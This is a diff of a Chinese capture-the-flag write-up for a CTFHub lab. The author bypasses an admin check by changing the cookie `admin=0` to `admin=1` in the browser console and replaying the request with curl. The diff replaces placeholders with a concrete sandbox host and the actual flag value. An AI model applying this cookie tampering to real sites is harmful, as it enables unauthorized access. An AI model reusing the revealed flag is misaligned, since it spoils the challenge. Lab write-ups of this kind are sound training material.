@@ -16,19 +16,19 @@
 
 ## 解题过程
 
-访问靶场后页面提示“只有 admin 才能拿到 flag”。我按 F12 打开控制台输入 `document.cookie`，看到服务器下发的 Cookie 是 `admin=0`，说明身份判断就是靠这个明文字段。我把控制台里执行 `document.cookie="admin=1"`，刷新页面，页面立刻返回了 flag。为了拿到能写进报告的原始请求，我又在终端用 `curl -i -b "admin=1" <环境地址>/` 重放了一次，请求头里就是 `Cookie: admin=1`，响应体里是 `ctfhub{...}`，提交后提示正确。
+访问靶场后页面提示“只有 admin 才能拿到 flag”。我按 F12 打开控制台输入 `document.cookie`，看到服务器下发的 Cookie 是 `admin=0`，说明身份判断就是靠这个明文字段。我把控制台里执行 `document.cookie="admin=1"`，刷新页面，页面立刻返回了 flag。为了拿到能写进报告的原始请求，我又在终端用 `curl -i -b "admin=1" <环境地址>/` 重放了一次，请求头里就是 `Cookie: admin=1`，响应体里是 `ctfhub{c88e97b8e8e465d1dcac1d12}`，提交后提示正确。
 
 ## 关键请求/响应
 
 ```http
 GET / HTTP/1.1
-Host: <环境地址的主机部分>
+Host: challenge-4a92d54f8dbd0cfc.sandbox.ctfhub.com:10800
 Cookie: admin=1
 
 HTTP/1.1 200 OK
 Content-Type: text/html; charset=UTF-8
 
-...(页面内容) ctfhub{...}
+...(页面内容) ctfhub{c88e97b8e8e465d1dcac1d12}
 
 --- 对照：不带 Cookie 或 admin=0 时 ---
 Cookie: admin=0
